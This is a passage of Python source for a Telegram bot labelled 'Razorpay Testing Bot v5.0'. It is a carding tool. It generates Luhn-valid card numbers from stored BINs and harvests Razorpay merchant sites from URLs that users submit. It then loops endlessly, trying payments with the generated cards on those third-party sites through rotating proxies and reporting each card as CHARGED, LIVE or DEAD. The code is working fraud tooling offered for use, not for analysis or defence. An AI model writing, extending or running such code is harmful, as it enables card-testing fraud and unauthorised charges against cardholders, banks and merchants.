    msg = await update.message.reply_text(
        f"{e('loading')} Testing {len(ctx.args)} proxy/proxies…", parse_mode=ParseMode.HTML)

    results, added, bad, dupe = [], 0, 0, 0
    for raw in ctx.args:
        info = parse_proxy(raw)
        if not info:
            bad += 1
            results.append(f"  {e('offline')} <code>{safe(raw[:40])}</code>  — invalid format")
            continue
        if raw in existing:
            dupe += 1
            results.append(f"  {e('star')} <code>{safe(raw[:40])}</code>  — duplicate (already stored)")
            continue

        ok, detail, lat = await deep_test_proxy(raw)
        if ok:
            await redis.lpush(RK_PROXIES, raw)
            existing.add(raw)
            added += 1
            results.append(
                f"  {e('live')} <code>{safe(raw[:40])}</code>  {lat}ms\n"
                f"     └ {safe(detail)}")
        else:
            bad += 1
            results.append(
                f"  {e('offline')} <code>{safe(raw[:40])}</code>  DEAD\n"
                f"     └ {safe(detail)}")

    total = await redis.llen(RK_PROXIES)
    summary = (
        f"{e('check')} <b>Proxy Add Results</b>\n\n"
        + "\n\n".join(results)
        + f"\n\n{e('live')} Added: <code>{added}</code>  "
        + f"{e('offline')} Failed: <code>{bad}</code>  "
        + f"{e('star')} Duplicate: <code>{dupe}</code>\n"
        + f"{e('proxy')} Total stored: <code>{total}</code>"
    )
    await msg.edit_text(summary, parse_mode=ParseMode.HTML)


@require_auth
async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(
            f"{e('error')} No proxies. Use /addpxy.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(p)}</code>" for i, p in enumerate(proxies, 1))
    await update.message.reply_text(
        f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_testpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
        return
    msg = await update.message.reply_text(
        f"{e('loading')} Deep-testing {len(proxies)} proxies…", parse_mode=ParseMode.HTML)
    results, live, dead = [], 0, 0
    for raw in proxies:
        ok, detail, lat = await deep_test_proxy(raw)
        if ok:
            live += 1
            results.append(
                f"  {e('live')} <code>{safe(raw[:40])}</code>  {lat}ms\n"
                f"     └ {safe(detail)}")
        else:
            dead += 1
            results.append(
                f"  {e('offline')} <code>{safe(raw[:40])}</code>  DEAD\n"
                f"     └ {safe(detail)}")
    await msg.edit_text(
        f"{e('proxy')} <b>Proxy Test Results</b>  "
        f"{e('live')}{live} live  {e('offline')}{dead} dead\n\n"
        + "\n\n".join(results),
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_rmpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await update.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
        return
    if ctx.args:
        try:
            idx = int(ctx.args[0]) - 1
            if 0 <= idx < len(proxies):
                await redis.lrem(RK_PROXIES, 1, proxies[idx])
                await update.message.reply_text(
                    f"{e('check')} Proxy removed.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    kb = [[btn(f"🗑 {(p[:40]+'…') if len(p)>40 else p}", f"rm_pxy_{i}")]
          for i, p in enumerate(proxies)]
    kb.append([btn("❌ Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} Select proxy to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb))


@require_auth
async def cmd_clrpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await redis.delete(RK_PROXIES)
    await update.message.reply_text(f"{e('check')} All proxies cleared.", parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════
#   BIN MANAGEMENT
# ══════════════════════════════════════════════════
@require_auth
async def cmd_addbim(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/addbim BIN1 BIN2 …</code>\n"
            f"Example: <code>/addbim 411111  5xxxxx|12|28|rnd</code>",
            parse_mode=ParseMode.HTML)
        return
    existing = set(await redis.lrange(RK_BINS, 0, -1))
    added = bad = dupe = 0
    for bp in ctx.args:
        ok, err = validate_bin(bp)
        if not ok:
            bad += 1
            continue
        if bp in existing:
            dupe += 1
            continue
        await redis.lpush(RK_BINS, bp)
        existing.add(bp)
        added += 1
    total = await redis.llen(RK_BINS)
    await update.message.reply_text(
        f"{e('check')} <b>BINs Added: {added}</b>\n"
        f"  {e('warning')} Invalid: <code>{bad}</code>  Dupe: <code>{dupe}</code>\n"
        f"  {e('bin')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_chkbim(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs. Use /addbim.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(b)}</code>" for i, b in enumerate(bins, 1))
    await update.message.reply_text(
        f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)


@require_auth
async def cmd_rmbin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await update.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
        return
    if ctx.args:
        try:
            idx = int(ctx.args[0]) - 1
            if 0 <= idx < len(bins):
                await redis.lrem(RK_BINS, 1, bins[idx])
                await update.message.reply_text(
                    f"{e('check')} BIN removed.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    kb = [[btn(f"🗑 {b}", f"rm_bin_{i}")] for i, b in enumerate(bins)]
    kb.append([btn("❌ Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} Select BIN to remove:",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))


@require_auth
async def cmd_binlookup(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/binlookup 411111</code>", parse_mode=ParseMode.HTML)
        return
    b6  = ctx.args[0][:8]
    msg = await update.message.reply_text(
        f"{e('loading')} Looking up BIN <code>{safe(b6)}</code>…", parse_mode=ParseMode.HTML)
    info = await lookup_bin(b6)
    await msg.edit_text(
        f"{e('bin')} <b>BIN: <code>{safe(b6)}</code></b>\n\n"
        f"  {e('card')}     Scheme:  <code>{info['scheme']}</code>\n"
        f"  {e('star')}     Type:    <code>{info['type']}</code>\n"
        f"  {e('diamond')}  Brand:   <code>{info['brand'] or 'N/A'}</code>\n"
        f"  {e('money')}    Bank:    <code>{safe(info['bank'])}</code>\n"
        f"  {e('location')} Country: <code>{safe(info['country'])}</code> {info['flag']}",
        parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════
#   PAYMENT TESTING
#   - Single status message, edited continuously
#   - 25 cards per batch
#   - Continuous until /stop
#   - Result lines sent to chat (not editing — too long)
# ══════════════════════════════════════════════════
@require_auth
async def cmd_fuck(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    bins  = await redis.lrange(RK_BINS,  0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites. Add with /addsite.", parse_mode=ParseMode.HTML)
        return
    if not bins:
        await update.message.reply_text(
            f"{e('error')} No BINs. Add with /addbim.", parse_mode=ParseMode.HTML)
        return

    proxies = await redis.llen(RK_PROXIES)
    # Use plain text amount labels in buttons (no HTML/emoji IDs)
    kb = InlineKeyboardMarkup([
        [btn("₹1",   "test_100"),  btn("₹5",   "test_500")],
        [btn("₹10",  "test_1000"), btn("₹50",  "test_5000")],
        [btn("₹100", "test_10000")],
        [btn("❌ Cancel", "cancel")],
    ])
    await update.message.reply_text(
        f"{e('fire')} <b>Payment Testing</b>\n\n"
        f"  {e('site')}  Sites:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies}</code>\n"
        f"  {e('mass')}  Batch:   <code>{BATCH_SIZE} cards</code>\n\n"
        f"{e('money')} <b>Select amount (INR):</b>",
        parse_mode=ParseMode.HTML, reply_markup=kb)


async def run_payment_test(chat_id: int, amount_paise: int,
                            ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Continuous batching:
    - Pre-check all sites, keep only live+Razorpay ones
    - Generate 25 cards at a time, test them all
    - Edit one persistent status message with running counters
    - Send batch result lines as a single chat message per batch
    - Loop until /stop or no more BINs
    """
    sites   = await redis.lrange(RK_SITES,   0, -1)
    bins    = await redis.lrange(RK_BINS,     0, -1)
    proxies = await redis.lrange(RK_PROXIES,  0, -1)

    if not sites or not bins:
        await ctx.bot.send_message(chat_id, f"{e('error')} Missing sites or BINs.",
                                   parse_mode=ParseMode.HTML)
        return

    amt_inr = amount_paise // 100

    # ── PRE-CHECK SITES ──────────────────────────
    status_msg = await ctx.bot.send_message(
        chat_id,
        f"{e('search')} <b>Pre-checking sites…</b>",
        parse_mode=ParseMode.HTML)

    live_sites: List[Tuple[str, str]] = []
    for site in sites:
        purl = get_random_proxy_url(proxies)
        ok, key, _ = await check_site_live(site, purl)
        if ok:
            live_sites.append((site, key))

    if not live_sites:
        await status_msg.edit_text(
            f"{e('offline')} <b>No live Razorpay sites found.</b>\n"
            f"Checked {len(sites)} site(s). Add working sites with /addsite.",
            parse_mode=ParseMode.HTML)
        return

    await status_msg.edit_text(
        f"{e('live')} {len(live_sites)}/{len(sites)} sites live — starting test…",
        parse_mode=ParseMode.HTML)

    # ── RUN ───────────────────────────────────────
    active_tests[chat_id] = True
    charged = live_ok = dead = batch_n = 0

    def _status_text():
        return (
            f"{e('cooking')} <b>Testing — ₹{amt_inr}</b>\n\n"
            f"  {e('mass')}    Batch:    <code>#{batch_n}</code>\n"
            f"  {e('success')} Charged:  <code>{charged}</code>\n"
            f"  {e('approved')} Live:    <code>{live_ok}</code>\n"
            f"  {e('declined')} Dead:    <code>{dead}</code>\n"
            f"  {e('site')}   Sites:    <code>{len(live_sites)}</code> live\n\n"
            f"{e('tds')} Running… use /stop to halt"
        )

    # Infinite loop — keep pulling 25 cards from random BINs
    while active_tests.get(chat_id):
        batch_n += 1
        bp = random.choice(bins)
        batch_cards = list(gen_cards(bp, BATCH_SIZE))
        if not batch_cards:
            continue

        try:
            await status_msg.edit_text(_status_text(), parse_mode=ParseMode.HTML)
        except Exception:
            pass

        result_lines: List[str] = []
        for card in batch_cards:
            if not active_tests.get(chat_id):
                break
            site_url, rzp_key = random.choice(live_sites)
            purl = get_random_proxy_url(proxies)
            res  = await attempt_payment(site_url, rzp_key, card, amount_paise, purl)
            await redis.incr("bot:stats:total_payments")

            if res["success"] and res["charge"]:
                charged += 1
                icon, tag = e("success"), "CHARGED"
            elif res["success"]:
                live_ok += 1
                icon, tag = e("approved"), "LIVE"
            else:
                dead += 1
                icon, tag = e("declined"), "DEAD"

            result_lines.append(
                f"{icon} <b>{tag}</b>  <code>{card}</code>\n"
                f"   {e('gateway')} {safe(site_url[:55])}\n"
                f"   {e('info')} {safe(res['resp'][:70])}  <code>{res['code']}</code>  {e('time')}{res.get('ts','')}"
            )

        # Send batch results as one chat message (not editing status)
        if result_lines:
            try:
                await ctx.bot.send_message(
                    chat_id,
                    f"{e('mass')} <b>Batch #{batch_n}</b>  "
                    f"[{e('success')}{charged} {e('approved')}{live_ok} {e('declined')}{dead}]\n\n"
                    + "\n\n".join(result_lines),
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass

        if active_tests.get(chat_id):
            await asyncio.sleep(BATCH_DELAY)

    active_tests.pop(chat_id, None)
    try:
        await status_msg.edit_text(
            f"{e('stop')} <b>Test Stopped</b>\n\n"
            f"  {e('mass')}    Batches:  <code>{batch_n}</code>\n"
            f"  {e('success')} Charged:  <code>{charged}</code>\n"
            f"  {e('approved')} Live:    <code>{live_ok}</code>\n"
            f"  {e('declined')} Dead:    <code>{dead}</code>\n"
            f"  {e('money')}   Amount:   <code>₹{amt_inr}</code>",
            parse_mode=ParseMode.HTML)
    except Exception:
        pass


@require_auth
async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    cid = update.effective_chat.id
    if active_tests.get(cid):
        active_tests[cid] = False
        await update.message.reply_text(
            f"{e('stop')} Stopping…", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(
            f"{e('info')} No active test.", parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════
#   /gen  — card generation
# ══════════════════════════════════════════════════
async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        await update.message.reply_text(f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
        return
    ok, rl = check_rate_limit(uid)
    if not ok:
        await update.message.reply_text(f"{e('cooldown')} {rl}", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await update.message.reply_text(
            f"{e('card')} <b>Usage:</b> <code>/gen BIN amount</code>\n"
            f"Example: <code>/gen 411111 100</code>",
            parse_mode=ParseMode.HTML)
        return
    bp = ctx.args[0]
    try:
        amt = int(ctx.args[1]) if len(ctx.args) > 1 else 10
    except ValueError:
        await update.message.reply_text(f"{e('error')} Amount must be a number.", parse_mode=ParseMode.HTML)
        return
    if amt < 1 or amt > MAX_LIMIT:
        await update.message.reply_text(f"{e('error')} 1–{MAX_LIMIT:,} only.", parse_mode=ParseMode.HTML)
        return
    ok2, err = validate_bin(bp)
    if not ok2:
        await update.message.reply_text(f"{e('error')} {err}", parse_mode=ParseMode.HTML)
        return

    b6 = bp.split("|")[0][:8]
    bin_info = await lookup_bin(b6)
    stat = await update.message.reply_text(
        f"{e('loading')} <b>Generating {amt:,} cards…</b>\n"
        f"  {e('bin')} <code>{safe(b6)}</code>  "
        f"{bin_info['scheme']} | {safe(bin_info['bank'])} | {safe(bin_info['country'])} {bin_info['flag']}",
        parse_mode=ParseMode.HTML)

    bd = bp.split("|")[0]
    fc = cc = 0
    chunk: List[str] = []
    try:
        for card in gen_cards(bp, amt):
            chunk.append(card)
            cc += 1
            if len(chunk) >= MAX_LINES_PER_FILE:
                fc += 1
                bio = BytesIO("\n".join(chunk).encode())
                bio.name = f"gen_{bd}_p{fc}.txt"
                bio.seek(0)
                await _send_doc(update.message, bio, fc, len(chunk))
                chunk = []
                await asyncio.sleep(SEND_DELAY)
        if chunk:
            fc += 1
            bio = BytesIO("\n".join(chunk).encode())
            bio.name = f"gen_{bd}_p{fc}.txt"
            bio.seek(0)
            await _send_doc(update.message, bio, fc, len(chunk))

        cur = int(await redis.hget(RK_STATS, "total_generated") or 0)
        await redis.hset(RK_STATS, "total_generated", str(cur + cc))

        await stat.edit_text(
            f"{e('success')} <b>Generated {cc:,} cards in {fc} file(s)</b>\n"
            f"  {e('bin')}  BIN:     <code>{safe(bd)}</code>\n"
            f"  {e('card')} Scheme:  <code>{bin_info['scheme']}</code>\n"
            f"  {e('money')} Bank:   <code>{safe(bin_info['bank'])}</code>\n"
            f"  {e('location')} Country: <code>{safe(bin_info['country'])}</code> {bin_info['flag']}",
            parse_mode=ParseMode.HTML)
    except Exception as ex:
        await stat.edit_text(
            f"{e('error')} Generation failed: {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)


async def _send_doc(msg, bio: BytesIO, part: int, count: int) -> None:
    cap = f"{e('check')} <b>Part {part}</b> — {count:,} cards  {e('fire')} Luhn-valid"
    for attempt in range(2):
        try:
            bio.seek(0)
            await msg.reply_document(document=bio, caption=cap, parse_mode=ParseMode.HTML)
            return
        except Exception as ex:
            logger.error(f"Doc send #{attempt+1}: {ex}")
            if attempt == 0:
                await asyncio.sleep(1.5)


# ══════════════════════════════════════════════════
#   /split
# ══════════════════════════════════════════════════
async def cmd_split(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        await update.message.reply_text(f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
        return
    ok, rl = check_rate_limit(uid)
    if not ok:
        await update.message.reply_text(f"{e('cooldown')} {rl}", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await update.message.reply_text(
            f"{e('mass')} Reply to a .txt file: <code>/split 5</code>", parse_mode=ParseMode.HTML)
        return
    try:
        n = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text(f"{e('error')} Number required.", parse_mode=ParseMode.HTML)
        return
    if n < 2 or n > MAX_SPLIT_PARTS:
        await update.message.reply_text(
            f"{e('error')} 2–{MAX_SPLIT_PARTS} parts.", parse_mode=ParseMode.HTML)
        return
    rep = update.message.reply_to_message
    if not rep or not rep.document:
        await update.message.reply_text(
            f"{e('error')} Reply to a .txt file.", parse_mode=ParseMode.HTML)
        return
    doc = rep.document
    fn = doc.file_name or "file.txt"
    if not fn.lower().endswith(".txt"):
        await update.message.reply_text(
            f"{e('error')} Only .txt files.", parse_mode=ParseMode.HTML)
        return
    stat = await update.message.reply_text(
        f"{e('loading')} Downloading…", parse_mode=ParseMode.HTML)
    try:
        buf = BytesIO()
        tf  = await doc.get_file()
        await tf.download_to_memory(out=buf)
        buf.seek(0)
        try:
            content = buf.read().decode("utf-8")
        except UnicodeDecodeError:
            buf.seek(0); content = buf.read().decode("utf-8", errors="replace")
        lines = [x.strip() for x in content.splitlines() if x.strip()]
        if not lines:
            await stat.edit_text(f"{e('error')} File empty.", parse_mode=ParseMode.HTML)
            return
        if n > len(lines):
            await stat.edit_text(
                f"{e('error')} {len(lines):,} lines < {n} parts.", parse_mode=ParseMode.HTML)
            return
        csz = math.ceil(len(lines) / n)
        chunks = [lines[i:i+csz] for i in range(0, len(lines), csz)]
        base = fn[:-4]
        await stat.edit_text(f"{e('loading')} Sending {len(chunks)} parts…", parse_mode=ParseMode.HTML)
        for i, ch in enumerate(chunks, 1):
            pb = BytesIO("\n".join(ch).encode())
            pb.name = f"{base}_p{i}of{len(chunks)}.txt"
            pb.seek(0)
            await _send_doc(update.message, pb, i, len(ch))
            await asyncio.sleep(SEND_DELAY)
        await stat.edit_text(
            f"{e('success')} Split <code>{len(lines):,}</code> lines → <b>{len(chunks)}</b> parts.",
            parse_mode=ParseMode.HTML)
    except Exception as ex:
        await stat.edit_text(
            f"{e('error')} {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════
#   /stats, /help, /info
# ══════════════════════════════════════════════════
@require_auth
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites   = await redis.llen(RK_SITES)
    proxies = await redis.llen(RK_PROXIES)
    bins    = await redis.llen(RK_BINS)
    sudos   = len(await redis.smembers(RK_SUDO))
    gen     = await redis.hget(RK_STATS, "total_generated") or "0"
    pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
    await update.message.reply_text(
        f"{e('stats')} <b>Bot Statistics</b>\n\n"
        f"  {e('site')}    Sites:    <code>{sites}</code>\n"
        f"  {e('proxy')}   Proxies:  <code>{proxies}</code>\n"
        f"  {e('bin')}     BINs:     <code>{bins}</code>\n"
        f"  {e('crown')}   Sudos:    <code>{sudos}</code>\n\n"
        f"  {e('card')}    Generated: <code>{gen}</code>\n"
        f"  {e('money')}   Payments:  <code>{pays}</code>\n\n"
        f"  {e('tds')}     Redis: {e('live')} Connected\n"
        f"  {e('fire')}    Version: <code>v5.0</code>",
        parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        return
    await update.message.reply_text(
        f"{e('search')} <b>Quick Help</b>\n\n"
        f"{e('card')} <code>/gen BIN amount</code>\n"
        f"  <code>/gen 411111 100</code>\n"
        f"  <code>/gen 5xxxxx|12|28|rnd 500</code>\n\n"
        f"{e('mass')} <code>/split N</code> — reply to .txt\n\n"
        f"{e('star')} Visa, MC, Amex, Discover, Diners, RuPay\n"
        f"{e('check')} Luhn-valid • Future expiry",
        parse_mode=ParseMode.HTML,
        reply_markup=user_home_kb())


async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        return
    is_admin = uid == ADMIN_USER_ID
    kb = admin_home_kb() if is_admin else user_home_kb()
    await update.message.reply_text(
        f"{e('info')} <b>Bot Info</b>\n\n"
        f"  {e('fire')}    v5.0\n"
        f"  {e('tds')}     Upstash Redis\n"
        f"  {e('proxy')}   4 proxy formats + live test on add\n"
        f"  {e('card')}    Up to <code>{MAX_LIMIT:,}</code> cards/req\n"
        f"  {e('mass')}    <code>{BATCH_SIZE}</code> cards/batch, continuous\n"
        f"  {e('clock')}   Rate: <code>{RATE_LIMIT}</code> req/{RATE_WINDOW}s",
        parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════
#   AUTO URL SCAN — MessageHandler
#   If authorized user sends text with http links,
#   or sends a .txt file, auto-scan for Razorpay sites.
# ══════════════════════════════════════════════════
async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Auto-detect Razorpay site links in:
    1. Plain text messages containing http/https URLs
    2. .txt file attachments with URLs
    """
    if not update.message:
        return
    uid = update.effective_user.id
    if not await is_authorized(uid):
        return

    msg     = update.message
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    purl    = get_random_proxy_url(proxies)
    existing = set(await redis.lrange(RK_SITES, 0, -1))

    # Case 1: text message with URLs
    if msg.text:
        urls = extract_urls_from_text(msg.text)
        if not urls:
            return
        stat = await msg.reply_text(
            f"{e('loading')} Auto-scanning {len(urls)} URL(s)…", parse_mode=ParseMode.HTML)
        added, exists, skip = await scan_and_store_urls(urls, purl, existing)
        if added == 0 and exists == 0:
            try:
                await stat.delete()
            except Exception:
                pass
            return  # silent if nothing relevant
        total = await redis.llen(RK_SITES)
        await stat.edit_text(
            f"{e('site')} <b>Auto-Scan</b>  {len(urls)} URL(s) found\n"
            f"  {e('live')}    Added:    <code>{added}</code>\n"
            f"  {e('star')}    Known:    <code>{exists}</code>\n"
            f"  {e('offline')} Skipped:  <code>{skip}</code>\n"
            f"  {e('stats')}   Total:    <code>{total}</code>",
            parse_mode=ParseMode.HTML)
        return

    # Case 2: .txt file
    if msg.document:
        doc = msg.document
        fn  = doc.file_name or ""
        if not fn.lower().endswith(".txt"):
            return
        stat = await msg.reply_text(
            f"{e('loading')} Reading file for URLs…", parse_mode=ParseMode.HTML)
        try:
            buf = BytesIO()
            tf  = await doc.get_file()
            await tf.download_to_memory(out=buf)
            buf.seek(0)
            try:
                content = buf.read().decode("utf-8")
            except UnicodeDecodeError:
                buf.seek(0); content = buf.read().decode("utf-8", errors="replace")

            urls = extract_urls_from_text(content)
            if not urls:
                await stat.edit_text(
                    f"{e('error')} No URLs found in file.", parse_mode=ParseMode.HTML)
                return

            await stat.edit_text(
                f"{e('loading')} Scanning {len(urls)} URLs from file…", parse_mode=ParseMode.HTML)
            added, exists, skip = await scan_and_store_urls(urls, purl, existing)
            total = await redis.llen(RK_SITES)
            await stat.edit_text(
                f"{e('site')} <b>File Scan Complete</b>\n"
                f"  {e('live')}    Added:    <code>{added}</code>\n"
                f"  {e('star')}    Known:    <code>{exists}</code>\n"
                f"  {e('offline')} Not RZP:  <code>{skip}</code>\n"
                f"  {e('stats')}   Total:    <code>{total}</code>",
                parse_mode=ParseMode.HTML)
        except Exception as ex:
            await stat.edit_text(
                f"{e('error')} {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════
#   INLINE CALLBACKS  — with Back navigation
# ══════════════════════════════════════════════════
async def callbacks(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    if not q:
        return
    await q.answer()

    uid  = q.from_user.id
    data = q.data
    cid  = q.message.chat_id
    is_admin = uid == ADMIN_USER_ID

    if not await is_authorized(uid):
        await q.answer("Access denied", show_alert=True)
        return

    # ── Removal actions ───────────────────────────
    if data.startswith("rm_site_"):
        idx   = int(data.split("_")[-1])
        sites = await redis.lrange(RK_SITES, 0, -1)
        if 0 <= idx < len(sites):
            await redis.lrem(RK_SITES, 1, sites[idx])
        await q.edit_message_text(f"{e('check')} Site removed.", parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("sites")]]))
        return

    if data.startswith("rm_pxy_"):
        idx     = int(data.split("_")[-1])
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        if 0 <= idx < len(proxies):
            await redis.lrem(RK_PROXIES, 1, proxies[idx])
        await q.edit_message_text(f"{e('check')} Proxy removed.", parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("proxy")]]))
        return

    if data.startswith("rm_bin_"):
        idx  = int(data.split("_")[-1])
        bins = await redis.lrange(RK_BINS, 0, -1)
        if 0 <= idx < len(bins):
            await redis.lrem(RK_BINS, 1, bins[idx])
        await q.edit_message_text(f"{e('check')} BIN removed.", parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("bins")]]))
        return

    # ── Payment test ───────────────────────────────
    if data.startswith("test_"):
        ap  = int(data.split("_")[1])
        inr = ap // 100
        await q.edit_message_text(
            f"{e('cooking')} <b>Launching test ₹{inr}…</b>\n"
            f"  {e('search')} Pre-checking sites\n"
            f"  {e('loading')} Starting batches of {BATCH_SIZE} cards",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(run_payment_test(cid, ap, ctx))
        return

    # ── Cancel ─────────────────────────────────────
    if data == "cancel":
        await q.edit_message_text(f"{e('check')} Cancelled.", parse_mode=ParseMode.HTML)
        return

    # ── Navigation ─────────────────────────────────
    if data == "nav_home" or data == "nav_back_home":
        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        gen     = await redis.hget(RK_STATS, "total_generated") or "0"
        pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
        role    = f"{e('crown')} Owner" if is_admin else f"{e('premium')} Sudo"
        text = (
            f"{e('fire')} <b>Razorpay Testing Bot v5.0</b>\n\n"
            f"{e('stats')} <b>Stats</b>\n"
            f"  {e('site')}  Sites    ›› <code>{sites}</code>\n"
            f"  {e('proxy')} Proxies  ›› <code>{proxies}</code>\n"
            f"  {e('bin')}   BINs     ›› <code>{bins}</code>\n"
            f"  {e('card')}  Generated ›› <code>{gen}</code>\n"
            f"  {e('money')} Payments  ›› <code>{pays}</code>\n\n"
            f"{e('key')} Role: {role}"
        )
        kb = admin_home_kb() if is_admin else user_home_kb()
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if data == "nav_test":
        sites = await redis.llen(RK_SITES)
        bins  = await redis.llen(RK_BINS)
        if sites == 0 or bins == 0:
            await q.edit_message_text(
                f"{e('error')} Need sites + BINs first.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
            return
        kb = InlineKeyboardMarkup([
            [btn("₹1", "test_100"),  btn("₹5", "test_500")],
            [btn("₹10","test_1000"), btn("₹50","test_5000")],
            [btn("₹100","test_10000")],
            [btn(f"{ec('back')} Back", "nav_home")],
        ])
        await q.edit_message_text(
            f"{e('money')} <b>Select Amount (INR)</b>\n\n"
            f"  {e('site')} Sites: <code>{sites}</code>  "
            f"{e('bin')} BINs: <code>{bins}</code>  "
            f"{e('mass')} {BATCH_SIZE} cards/batch",
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if data == "nav_sites":
        sites = await redis.lrange(RK_SITES, 0, -1)
        text  = (f"{e('site')} <b>Sites ({len(sites)})</b>\n\n"
                 + ("\n".join(f"  {i}. <code>{safe(s)}</code>"
                              for i, s in enumerate(sites, 1))
                    if sites else f"  {e('error')} None — use /addsite"))
        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
        return

    if data == "nav_proxy":
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        text    = (f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n"
                   + ("\n".join(f"  {i}. <code>{safe(p)}</code>"
                                for i, p in enumerate(proxies, 1))
                      if proxies else f"  {e('error')} None — use /addpxy"))
        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
        return

    if data == "nav_bins":
        bins = await redis.lrange(RK_BINS, 0, -1)
        text = (f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n"
                + ("\n".join(f"  {i}. <code>{safe(b)}</code>"
                             for i, b in enumerate(bins, 1))
                   if bins else f"  {e('error')} None — use /addbim"))
        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
        return

    if data == "nav_stats":
        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        gen     = await redis.hget(RK_STATS, "total_generated") or "0"
        pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
        await q.edit_message_text(
            f"{e('stats')} <b>Live Stats</b>\n\n"
            f"  {e('site')}  Sites:     <code>{sites}</code>\n"
            f"  {e('proxy')} Proxies:   <code>{proxies}</code>\n"
